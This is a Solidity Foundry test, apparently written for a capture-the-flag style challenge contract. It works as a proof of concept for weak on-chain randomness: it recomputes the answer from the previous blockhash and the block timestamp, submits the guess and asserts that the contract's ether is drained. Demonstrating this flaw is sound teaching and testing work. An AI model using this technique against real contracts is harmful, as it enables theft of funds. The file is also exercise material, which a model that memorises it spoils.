
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge public challenge;
    
    uint256 deployBlockNumber;
    uint256 deployBlockTimestamp;

    function setUp() public {
        // Store the block state at deployment time
        deployBlockNumber = block.number;
        deployBlockTimestamp = block.timestamp;
        
        // Deploy the contract with 1 ether as required
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber, uint256 blockTimestamp) public {
        
        // --- 1. Constraints ---
        // Ensure block number is valid (greater than 0 so blockhash(block.number - 1) works)
        vm.assume(blockNumber > 0);
        vm.assume(blockNumber < type(uint256).max - 1000);
        
        // Ensure timestamp is reasonable
        vm.assume(blockTimestamp > 0);
        vm.assume(blockTimestamp < type(uint256).max - 1000);

        // --- 2. State Configuration ---
        
        // Manipulate block environment before deployment
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);
        
        // We need to set the blockhash for the previous block
        // In Foundry, we can use vm.store to directly read storage, but for this test
        // we'll deploy a new contract with controlled block state
        
        // Fund this test contract
        vm.deal(address(this), 10 ether);
        
        // Deploy a new challenge contract with the controlled block state
        GuessTheRandomNumberChallenge newChallenge = new GuessTheRandomNumberChallenge{value: 1 ether}();

        // --- 3. Replication & Assertion ---
        
        // Predict the outcome by replicating the vulnerable logic
        // The answer is calculated as:
        // answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        
        // Since we're in the same block context, we can calculate the exact same value
        bytes32 prevBlockHash = blockhash(block.number - 1);
        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(prevBlockHash, block.timestamp))));
        
        // Execute the guess with our predicted answer
        newChallenge.guess{value: 1 ether}(predictedAnswer);
        
        // Assert that we successfully drained the contract (proving predictability)
        assertTrue(newChallenge.isComplete(), "Failed to predict the random number - contract should be drained");
        assertEq(address(newChallenge).balance, 0, "Contract balance should be 0 after successful guess");
    }
    
    receive() external payable {}
}
